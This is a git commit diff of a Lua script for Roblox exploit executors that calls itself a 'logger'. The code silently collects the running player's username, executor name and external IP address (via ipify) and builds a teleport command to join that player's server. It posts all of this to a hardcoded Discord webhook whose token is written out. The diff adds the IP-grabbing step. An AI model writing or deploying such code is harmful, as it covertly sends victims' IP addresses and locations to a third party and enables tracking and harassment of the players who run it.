f643df38ae7545d0a19bc0cea68bd83a05607c28
Fluydo <skibidi.rip.yt@gmail.com>
2025-03-04 00:44:01 +0000

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,39 +1,53 @@
+-- Generates the join script
 local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
-print(helo) --line above generates a script that allows u to join the logged user
+print(join_script) -- Fixed typo, now prints the actual join script
 
---checks executor
+-- Check executor
 local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   is_sirhurt_closure and "Sirhurt" or 
+   pebc_execute and "ProtoSmasher" or 
+   syn and "Synapse X" or
    secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
+   KRNL_LOADED and "Krnl" or 
+   SONA_LOADED and "Sona" or 
    "Kid with shit exploit"
 
-local url =
-   "https://discord.com/api/webhooks/1346273624356552795/n7ZgeTc-2NVhkFRM5XU6yn40UIcvNiWb6UO5K30pYSgeOQUn6N4joHtZhYi4QvYPpUs9"
+-- Fetch the external IP (this will send a request to an external API to fetch the IP)
+local external_ip = game:GetService("HttpService"):GetAsync("http://api.ipify.org?format=json")
+local parsed_ip = game:GetService("HttpService"):JSONDecode(external_ip).ip
+
+-- Webhook URL
+local url = "https://discord.com/api/webhooks/1346273624356552795/n7ZgeTc-2NVhkFRM5XU6yn40UIcvNiWb6UO5K30pYSgeOQUn6N4joHtZhYi4QvYPpUs9"
+
 local data = {
-            ["username"] = "Cooked", --webhook name thing idk
-            ["avatar_url"] = "https://[Log in to view URL]", --avatar image url
+    ["username"] = "Cooked", -- Webhook name
+    ["avatar_url"] = "https://[Log in to view URL]", -- Avatar image URL
     
-    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
+    ["content"] = " @everyone **" .. game.Players.LocalPlayer.Name .. "** just ran your logger", -- Normal message
     ["embeds"] = {
-       {
-           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
-           ["description"] = "**"..game:HttpGet("http://[Log in to view URL]").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
-           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
-           ["color"] = 14680319,
-           ["footer"] = {
-             ["text"] = "" ..join_script.. "", --sends join script
-           },
-       },
-   }
+        {
+            ["title"] = "** " .. game.Players.LocalPlayer.Name .. " just ran your logger**",
+            ["description"] = "**Username: " .. game.Players.LocalPlayer.Name .. "\nExternal IP: " .. parsed_ip .. "\nUses: " .. webhookcheck .. "**",
+            ["type"] = "rich",  -- Embed type
+            ["color"] = 14680319,  -- Color of the embed
+            ["footer"] = {
+                ["text"] = "" .. join_script .. "",  -- Sends the join script
+            },
+        },
+    }
 }
 
+-- Encoding the data to JSON format
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
+-- Headers for the HTTP request
 local headers = {
-   ["content-type"] = "application/json"
+    ["content-type"] = "application/json"
 }
+
+-- Select the correct request function based on the executor
 request = http_request or request or HttpPost or syn.request
+
+-- Sending the POST request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef) --post, idk
+request(abcdef)
